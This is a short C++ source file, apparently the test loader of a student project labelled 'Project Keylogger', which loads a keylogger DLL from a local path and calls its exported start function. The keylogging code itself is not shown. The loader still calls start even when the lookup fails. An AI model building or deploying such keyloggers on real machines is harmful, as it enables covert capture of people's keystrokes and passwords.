/**
 *								Project Keylogger
 */

#include						<windows.h>
#include						<iostream>

#include						"KeyloggerDLL.h"

typedef bool (_stdcall *f_start)();

int main() 
{
	HMODULE module = NULL;
	if (((module = LoadLibrary((LPCTSTR) "H:\\Users\\darrac_s\\Work\\Projects\\Spider\\Tests\\keylogger_dll\\generated_code\\keylogger.dll"))) == NULL)
	{
		return -1;
	}
	f_start start = (f_start)GetProcAddress(module, "start");
	if (!start)
	{
		std::cout << "Could not load the start function" << std::endl;
	}
	start();
	return 0;
}